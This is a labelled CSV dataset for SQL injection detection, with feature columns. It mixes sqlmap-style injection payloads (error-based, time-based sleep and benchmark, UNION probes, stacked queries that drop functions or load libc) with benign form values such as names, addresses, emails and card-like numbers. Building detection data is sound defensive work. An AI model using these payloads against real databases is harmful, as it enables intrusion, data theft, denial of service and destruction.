Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1'+(select zpns where 6922=6922 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",1,select zpns where and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by,205,20,2,0,10,0,14,1,4,112,10,5
17800,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1 where 7906=7906 or 8156=(select count(*) from generate_series(1,5000000))--",1,where or select count from generate_series,77,6,0,0,4,1,7,1,3,36,4,1
naredo reggiardo,0,naredo reggiardo,16,2,0,0,0,0,1,0,0,15,0,0
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- viti",1,or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 viti,163,13,0,0,7,1,11,1,4,52,7,3
vernn,0,vernn,5,1,0,0,0,0,0,0,0,5,0,0
sauvanelex@gaudio.lk,0,sauvanelex gaudio lk,20,3,0,0,2,0,0,0,0,18,0,0
-3339' or 8571=8571--,1,or,21,1,1,0,1,1,2,1,3,2,0,0
trese,0,trese,5,1,0,0,0,0,0,0,0,5,0,0
14460,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1) where 8164=8164 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,125,21,0,0,9,1,15,1,3,76,8,1
1'+(select zmbu where 8685=8685 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',1,select zmbu where rlike select case when then else 0x28 end,94,11,2,0,2,0,13,0,2,46,9,0
"-9313%"") or 5971=4572#",1,or,22,1,0,1,3,1,2,1,1,2,0,0
po2546oto4,0,po2546oto4,10,1,0,0,0,0,0,0,0,5,0,0
獹,0,,1,0,0,0,0,0,0,0,0,0,0,0
clusella baldom,0,clusella baldom,15,2,0,0,0,0,1,0,0,14,0,0
14412,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"" where 1809=1809 and make_set(8403=8403,8899)--",1,where and make_set,49,3,0,1,4,1,4,1,2,15,2,1
borox,0,borox,5,1,0,0,0,0,0,0,0,5,0,0
"1%""))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,109,16,0,1,7,1,11,1,3,72,6,1
e,0,,1,0,0,0,0,0,0,0,0,1,0,0
37216,0,,5,0,0,0,0,0,0,0,0,0,0,0
50793,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1%""));select sleep(5)#",1,select sleep,22,2,0,1,3,1,1,0,0,11,1,1
93777834a,0,93777834a,9,1,0,0,0,0,0,0,0,1,0,0
1' or sleep(5) and 'rpqn' like 'rpqn,1,or sleep and rpqn like rpqn,36,6,4,0,0,0,6,2,0,22,3,1
4344811902014577,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1' where 5230=5230;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,where select like abcdefg upper hex randomblob,79,7,3,0,3,1,3,0,3,40,3,3
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('cuav'='cuav,1,and in char char char char char select case when then char else char end char char char char char and cuav cuav,204,23,4,0,2,0,14,2,10,89,9,12
adamson,0,adamson,7,1,0,0,0,0,0,0,0,7,0,0
"-9987))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((2114=2114",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,220,23,0,0,26,0,14,2,1,83,9,10
1'+(select 'jaok' where 2592=2592;select sleep(5))+',1,select jaok where select sleep,52,5,4,0,2,0,4,0,2,26,3,1
"1' in boolean mode) and elt(9630=4765,4765)#",1,in boolean mode and elt,44,5,1,0,3,1,5,1,0,19,2,1
hirn,0,hirn,4,1,0,0,0,0,0,0,0,4,0,0
bashan@lettere.pr,0,bashan lettere pr,17,3,0,0,2,0,0,0,0,15,0,0
9610160798994591,0,,16,0,0,0,0,0,0,0,0,0,0,0
-1277'))) order by 1--,1,order by,22,2,1,0,0,1,3,0,3,7,2,0
1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--,1,select yyil from dual where if select else drop function qmno,96,11,3,0,5,1,11,0,2,51,7,1
34839,0,,5,0,0,0,0,0,0,0,0,0,0,0
"-5193 where 2175=2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",1,where union all select,89,4,0,0,11,1,6,0,1,19,4,0
8000,0,,4,0,0,0,0,0,0,0,0,0,0,0
"-8347%') union all select 7643,7643,7643--",1,union all select,42,3,1,0,3,1,4,0,3,14,3,0
"1) as cjmt where 4839=4839 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1,as cjmt where procedure analyse extractvalue concat 0x5c benchmark md5 0x52515a50,118,11,0,0,5,1,6,0,2,60,2,6
martn miguel,0,martn miguel,12,2,0,0,0,0,1,0,0,11,0,0
"1%"");select (case when (3168=5577) then 3168 else 3168*(select 3168 from mysql.db) end)#",1,select case when then else select from mysql db end,88,10,0,1,5,1,11,0,1,42,8,0
dao,0,dao,3,1,0,0,0,0,0,0,0,3,0,0
"1')) and 8635=(select count(*) from generate_series(1,5000000))--",1,and select count from generate_series,65,5,1,0,3,1,5,1,3,32,3,1
1 where 8889=8889;if(7899=7899) select 7899 else drop function zbbp--,1,where if select else drop function zbbp,69,7,0,0,3,1,8,0,2,33,5,1
"1 where 1576=1576;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,where select dbms_pipe receive_message chr chr chr chr from dual,102,10,0,0,12,1,5,0,2,53,3,6
89372245h,0,89372245h,9,1,0,0,0,0,0,0,0,1,0,0
doa,0,doa,3,1,0,0,0,0,0,0,0,3,0,0
adolfo,0,adolfo,6,1,0,0,0,0,0,0,0,6,0,0
8673,0,,4,0,0,0,0,0,0,0,0,0,0,0
kinsman,0,kinsman,7,1,0,0,0,0,0,0,0,7,0,0
"1%"") and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,and like abcdefg upper hex randomblob,67,6,2,1,3,1,2,1,3,32,2,3
25938703q,0,25938703q,9,1,0,0,0,0,0,0,0,1,0,0
tajahuerce,0,tajahuerce,10,1,0,0,0,0,0,0,0,10,0,0
mc'morral obrist,0,mc morral obrist,16,3,1,0,0,0,1,0,0,14,0,0
nicasio,0,nicasio,7,1,0,0,0,0,0,0,0,7,0,0
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('uyft'='uyft",1,create or replace function sleep int returns int as lib libc so sleep language strict select sleep and uyft uyft,138,20,10,0,6,0,15,2,2,94,6,4
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""dtwv"" like ""dtwv",1,or char char char char regexp_substring repeat right char null and dtwv like dtwv,128,14,0,4,11,0,6,2,0,67,5,8
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",1,as wjdc where and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,216,24,0,1,25,1,16,1,2,86,10,10
6689689469452036,0,,16,0,0,0,0,0,0,0,0,0,0,0
1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,1,as clbc where begin dbms_lock sleep end,60,7,1,0,5,1,6,0,2,32,4,1
"1%"" union all select null,null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null null,67,12,0,1,9,1,4,0,2,50,12,0
1%')) and (3020=3020)*6703 and (('%'=',1,and and,38,2,4,0,4,0,4,2,1,6,2,0
"1%')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",1,call regexp_substring repeat left crypt_key char char char null null and,118,11,4,0,14,0,3,1,0,60,5,7
beverly.lormer@decobiombo.ni,0,beverly lormer decobiombo ni,28,4,0,0,3,0,0,0,0,25,0,0
1))) or sleep(5)#,1,or sleep,17,2,0,0,1,1,2,1,0,7,1,1
"1"")) union all select null#",1,union all select null,27,4,0,1,1,1,4,0,0,18,4,0
8330458587602542,0,,16,0,0,0,0,0,0,0,0,0,0,0
ci2586ta,0,ci2586ta,8,1,0,0,0,0,0,0,0,4,0,0
09339,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,95,15,0,1,7,1,9,0,3,69,5,1
"-2001'+(select 'nput' where 8368=8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",1,select nput where union all select,100,6,3,0,10,1,7,0,2,29,5,0
43061609c,0,43061609c,9,1,0,0,0,0,0,0,0,1,0,0
"c/ academia, 59, 3?g",0,academia,20,1,0,0,3,0,3,0,1,10,0,0
segura de los baos,0,segura de los baos,18,4,0,0,0,0,3,0,0,15,0,0
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('tzbp'='tzbp",1,and select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and tzbp tzbp,181,15,4,0,8,0,12,2,2,60,8,3
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz",1,or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 lgoz,162,13,0,0,8,1,11,1,2,52,7,3
"-8557 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,or group by concat 0x7171706a71 select case when then else end 0x717a767a71 floor rand having min,136,16,0,0,5,1,15,1,2,63,10,3
naestiberger@biogasworld.rs,0,naestiberger biogasworld rs,27,3,0,0,2,0,0,0,0,25,0,0
93sci06i745o,0,93sci06i745o,12,1,0,0,0,0,0,0,0,5,0,0
"luis braille, 193 6?a",0,luis braille,21,2,0,0,2,0,3,0,0,12,0,0
"1') or elt(6272=6272,sleep(5)) and ('yznd' like 'yznd",1,or elt sleep and yznd like yznd,53,7,4,0,2,0,6,2,0,25,3,2
"-8065""))) order by 1--",1,order by,22,2,0,1,0,1,3,0,3,7,2,0
"-3234%"")) or elt(1032=1032,3623) and ((""%""=""",1,or elt and,44,3,0,4,5,0,4,2,1,8,2,1
1'));begin dbms_lock.sleep(5); end and (('eqoc' like 'eqoc,1,begin dbms_lock sleep end and eqoc like eqoc,58,8,4,0,4,0,6,1,0,36,4,1
f,0,,1,0,0,0,0,0,0,0,0,1,0,0
torre-pacheco,0,torre pacheco,13,2,0,0,0,0,0,0,1,12,0,0
kjell,0,kjell,5,1,0,0,0,0,0,0,0,5,0,0
"-2359' union all select 2687,2687,2687#",1,union all select,39,3,1,0,3,1,4,0,1,14,3,0
6$ng4tado,0,ng4tado,9,1,0,0,1,0,0,0,0,6,0,0
horalek,0,horalek,7,1,0,0,0,0,0,0,0,7,0,0
palazuelos de eresma,0,palazuelos de eresma,20,3,0,0,0,0,2,0,0,18,0,0
~,0,,1,0,0,0,1,0,0,0,0,0,0,0
1755897947554799,0,,16,0,0,0,0,0,0,0,0,0,0,0
3,0,,2,0,0,0,0,0,0,0,0,0,0,0
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""cgpm"" like ""cgpm",1,or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by and cgpm like cgpm,225,25,0,4,8,0,23,2,3,113,15,5
"1"" or elt(6272=6272,sleep(5)) and ""zzca""=""zzca",1,or elt sleep and zzca zzca,46,6,0,4,3,0,4,2,0,21,2,2
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",1,as puws where select case when then else cast as int select from dual end from dual,126,17,0,1,3,1,19,0,3,67,12,0
"1%' union all select null,null,null,null,null,null,null--",1,union all select null null null null null null null,57,10,1,0,7,1,4,0,2,42,10,0
"1'||(select 'xpjg' where 3036=3036 and elt(1832=6644,6644))||'",1,select xpjg where and elt,62,5,4,0,7,0,5,1,0,21,3,1
"-3707""))) or 8571=8571--",1,or,24,1,0,1,1,1,2,1,3,2,0,0
"1%')) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,procedure analyse extractvalue concat 0x5c benchmark md5 0x4b774c75,96,8,1,0,6,1,2,0,0,50,0,6
no3otr46,0,no3otr46,8,1,0,0,0,0,0,0,0,5,0,0
denys,0,denys,5,1,0,0,0,0,0,0,0,5,0,0
cortegana,0,cortegana,9,1,0,0,0,0,0,0,0,9,0,0
utilitarismo,0,utilitarismo,12,1,0,0,0,0,0,0,0,12,0,0
e00tr6o,0,e00tr6o,7,1,0,0,0,0,0,0,0,4,0,0
enrique,0,enrique,7,1,0,0,0,0,0,0,0,7,0,0
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('izyf'='izyf,1,and select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and izyf izyf,253,30,4,0,29,0,17,2,0,112,11,15
"1') as mara where 7164=7164;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,as mara where select like abcdefg upper hex randomblob,88,9,3,0,3,1,5,0,3,46,4,3
3,0,,2,0,0,0,0,0,0,0,0,0,0,0
ehninger,0,ehninger,8,1,0,0,0,0,0,0,0,8,0,0
"c/ zumalacarregui 87,",0,zumalacarregui,21,1,0,0,1,0,2,0,1,15,0,0
"1 where 4940=4940;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1,where call regexp_substring repeat right char null,85,7,0,0,6,1,3,0,2,43,4,4
ma724-3ra,0,ma724 3ra,9,2,0,0,0,0,0,0,1,4,0,0
53486450l,0,53486450l,9,1,0,0,0,0,0,0,0,1,0,0
"1)) as zykv where 2158=2158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,as zykv where select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,115,16,0,0,11,1,12,0,3,71,4,1
"1"") where 1666=1666 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,where or select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,171,26,0,1,8,1,21,1,3,113,11,1
schaafsma@gay-tantra.sj,0,schaafsma gay tantra sj,23,4,0,0,2,0,0,0,1,20,0,0
"c/ misericordia, 57 7-h",0,misericordia,23,1,0,0,1,0,3,0,2,14,0,0
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('bemh'='bemh",1,and benchmark md5 0x76555642 and bemh bemh,67,7,4,0,3,0,4,2,0,26,2,2
mccauley@autobuses-hibridos.ph,0,mccauley autobuses hibridos ph,30,4,0,0,2,0,0,0,1,27,0,0
kolanko lisarde,0,kolanko lisarde,15,2,0,0,0,0,1,0,0,14,0,0
reco+nocida,0,reco nocida,11,2,0,0,0,0,0,0,1,10,0,0
"1' where 7910=7910;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,where select from generate_series case when then else end limit,109,10,1,0,6,1,14,0,3,53,9,0
6087,0,,4,0,0,0,0,0,0,0,0,0,0,0
aubine,0,aubine,6,1,0,0,0,0,0,0,0,6,0,0
"-1889%'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,218,23,4,0,28,0,14,2,1,83,9,10
daisey,0,daisey,6,1,0,0,0,0,0,0,0,6,0,0
forst,0,forst,5,1,0,0,0,0,0,0,0,5,0,0
9131603493426395,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('skdm'='skdm",1,or extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71 and skdm skdm,112,11,4,0,7,0,5,2,0,47,3,3
villaeles de valdavia,0,villaeles de valdavia,21,3,0,0,0,0,2,0,0,19,0,0
"1');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,select from generate_series case when then else end limit,94,9,1,0,5,1,12,0,3,48,8,0
antonelli-ankrum@escarba.pm,0,antonelli ankrum escarba pm,27,4,0,0,2,0,0,0,1,24,0,0
6679885410766577,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1%"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""%""=""",1,or char char char char regexp_substring repeat right char null and,119,11,0,4,14,0,4,2,0,55,4,8
"1"" where 5333=5333 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,where and char char char char regexp_substring repeat right char null,126,11,0,1,12,1,4,1,2,58,4,8
1 or (select * from (select(sleep(5)))sddo)#,1,or select from select sleep sddo,44,6,0,0,1,1,5,1,1,27,4,1
74835105m,0,74835105m,9,1,0,0,0,0,0,0,0,1,0,0
vilabella,0,vilabella,9,1,0,0,0,0,0,0,0,9,0,0
karlette24,0,karlette24,10,1,0,0,0,0,0,0,0,8,0,0
"1')) union all select null,null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null null,67,12,1,0,9,1,4,0,0,50,12,0
nery,0,nery,4,1,0,0,0,0,0,0,0,4,0,0
yang_lindekens@nightflight.dm,0,yang_lindekens nightflight dm,29,3,0,0,3,0,0,0,0,26,0,0
-4610')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('hdco'='hdco,1,or select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and hdco hdco,258,30,4,0,29,0,17,2,1,111,11,15
rgiva,0,rgiva,5,1,0,0,0,0,0,0,0,5,0,0
py,0,py,2,1,0,0,0,0,0,0,0,2,0,0
5388507530059847,0,,16,0,0,0,0,0,0,0,0,0,0,0
c96reveidil5,0,c96reveidil5,12,1,0,0,0,0,0,0,0,9,0,0
e46ola5,0,e46ola5,7,1,0,0,0,0,0,0,0,4,0,0
"1',(select (case when (1902=5536) then 1 else 1902*(select 1902 from master..sysdatabases) end))",1,select case when then else select from master sysdatabases end,96,10,1,0,4,0,11,0,1,53,8,0
4617331244727589,0,,16,0,0,0,0,0,0,0,0,0,0,0
1' in boolean mode) and sleep(5)#,1,in boolean mode and sleep,33,5,1,0,1,1,5,1,0,21,2,1
1) as oknr where 3228=3228;(select * from (select(sleep(5)))srmq)--,1,as oknr where select from select sleep srmq,67,8,0,0,2,1,7,0,3,36,5,1
"1'+(select sfmz where 4870=4870 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,select sfmz where or char char char char regexp_substring repeat left crypt_key char char char null null,169,17,1,0,18,1,5,1,3,86,6,11
"-1844""))) or make_set(9354=9354,7185) and (((""abdw"" like ""abdw",1,or make_set and abdw like abdw,62,6,0,4,3,0,6,2,1,24,3,1
yxe)fxv,0,yxe fxv,8,2,0,0,0,0,0,0,0,6,0,0
-2793') where 2621=2621 union all select 2621#,1,where union all select,46,4,1,0,2,1,6,0,1,19,4,0
pistan robredo,0,pistan robredo,14,2,0,0,0,0,1,0,0,13,0,0
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('igqm'='igqm",1,and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by and igqm igqm,194,20,4,0,10,0,13,2,2,108,9,5
cottencon@palomajimenez.mr,0,cottencon palomajimenez mr,26,3,0,0,2,0,0,0,0,24,0,0
miramar,0,miramar,7,1,0,0,0,0,0,0,0,7,0,0
"1""))) and (7396=6351)*6351 and (((""xerw"" like ""xerw",1,and and xerw like xerw,51,5,0,4,1,0,6,2,1,18,3,0
plza. de los conquistadores 182,0,plza de los conquistadores,31,4,0,0,1,0,4,0,0,23,0,0
h9655,0,h9655,5,1,0,0,0,0,0,0,0,1,0,0
(select (case when (6838=2866) then 6838 else 1/(select 0) end)),1,select case when then else select end,64,7,0,0,1,0,9,0,1,31,7,0
"cami son anglada, s/n",0,cami son anglada,21,3,0,0,1,0,3,0,1,16,0,0
5537760506536596,0,,16,0,0,0,0,0,0,0,0,0,0,0
wittik,0,wittik,6,1,0,0,0,0,0,0,0,6,0,0
calle horreo 85 10?d,0,calle horreo,20,2,0,0,1,0,3,0,0,12,0,0
97228883v,0,97228883v,9,1,0,0,0,0,0,0,0,1,0,0
"1))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,and char char char char regexp_substring repeat right char null,112,10,0,0,11,1,2,1,2,53,3,8
culpada,0,culpada,7,1,0,0,0,0,0,0,0,7,0,0
pontigo,0,pontigo,7,1,0,0,0,0,0,0,0,7,0,0
1' where 4403=4403 rlike sleep(5)#,1,where rlike sleep,34,3,1,0,2,1,4,0,0,15,2,1
1 where 8921=8921 rlike (select * from (select(sleep(5)))sgvo)--,1,where rlike select from select sleep sgvo,64,7,0,0,1,1,7,0,3,35,5,1
1n154c3602,0,1n154c3602,10,1,0,0,0,0,0,0,0,2,0,0
wahlberg8@am-si.np,0,wahlberg8 am si np,18,4,0,0,2,0,0,0,1,14,0,0
"1'||(select 'lpej' from dual where 8294=8294 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",1,select lpej from dual where or select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by,218,22,4,0,14,0,16,1,2,119,11,5
nogueira de ramun,0,nogueira de ramun,17,3,0,0,0,0,2,0,0,15,0,0
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",1,call regexp_substring repeat left crypt_key char char char null null and squx like squx,127,14,0,4,11,0,5,1,0,72,6,7
97lea0,0,97lea0,6,1,0,0,0,0,0,0,0,3,0,0
matungo,0,matungo,7,1,0,0,0,0,0,0,0,7,0,0
"-5606) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1,union all select,69,3,0,0,9,1,4,0,1,14,3,0
0669143201019058,0,,16,0,0,0,0,0,0,0,0,0,0,0
46317,0,,5,0,0,0,0,0,0,0,0,0,0,0
9771406974624162,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1) where 6090=6090;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,where select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,106,14,0,0,11,1,10,0,3,65,3,1
"1' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,and char char char char regexp_substring repeat right char null,110,10,1,0,11,1,2,1,2,53,3,8
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",1,and select count from generate_series and,78,6,0,0,4,0,7,2,1,35,4,1
-9562' or 8571=8571--,1,or,21,1,1,0,1,1,2,1,3,2,0,0
desintegrar,0,desintegrar,11,1,0,0,0,0,0,0,0,11,0,0
6020931193339547,0,,16,0,0,0,0,0,0,0,0,0,0,0
r,0,,2,0,0,0,0,0,0,0,0,1,0,0
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",1,and and wvma like wvma,49,5,0,4,1,0,6,2,1,18,3,0
1') as upgb where 2031=2031;select case when 7717=7717 then 1 else null end--,1,as upgb where select case when then else null end,77,10,1,0,3,1,12,0,2,40,9,0
"1"")) as ycvh where 4523=4523 and sleep(5)#",1,as ycvh where and sleep,42,5,0,1,2,1,6,1,0,19,3,1
